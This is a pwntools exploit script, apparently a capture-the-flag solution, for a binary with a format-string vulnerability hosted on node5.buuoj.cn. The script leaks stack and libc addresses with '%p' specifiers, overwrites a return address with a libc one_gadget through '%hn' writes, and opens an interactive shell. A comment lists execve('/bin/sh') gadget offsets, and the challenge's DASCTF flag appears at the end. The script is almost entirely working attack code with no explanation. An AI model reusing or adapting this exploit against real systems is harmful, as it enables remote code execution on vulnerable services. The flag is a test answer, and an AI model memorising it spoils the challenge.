#!/usr/bin/python3

from pwn import *

exe = ELF('pwn_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
sln = lambda msg, num: sla(msg, str(num).encode())
sn = lambda msg, num: sa(msg, str(num).encode())

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b* 0x40082A

        c
        ''')
        input()


if args.REMOTE:
    p = remote('node5.buuoj.cn', 27945)
else:
    p = process(exe.path)
pa = b"%6$p|%9$p|"
sla(b'keyword\n', pa)
stack = int(p.recvuntil(b"|",drop=True), 16) - 0xd8
libc.address = int(p.recvuntil(b"|",drop=True), 16) - 0x20840
info("stack: " + hex(stack))
info("libc.address: " + hex(libc.address))

input()
pa = f"%{stack & 0xffff}c%11$hn"
sla(b'keyword\n', pa)
input()
pa = f"%{(libc.address + 0xf1247) & 0xffff}c%37$hn"
sla(b'keyword\n', pa)
input()
pa = f"%{(stack+2) & 0xffff}c%11$hn"
sla(b'keyword\n', pa)
GDB()
input()
pa = f"%{(libc.address + 0xf1247) >> 16 & 0xffff}c%37$hn"
sla(b'keyword\n', pa)
p.interactive()
'''
0x4527a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL || {[rsp+0x30], [rsp+0x38], [rsp+0x40], [rsp+0x48], ...} is a valid argv

0xf03a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL || {[rsp+0x50], [rsp+0x58], [rsp+0x60], [rsp+0x68], ...} is a valid argv

0xf1247 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...} is a valid argv
'''
# DASCTF{90d89f32-172a-488e-90ef-c6ca926b537c}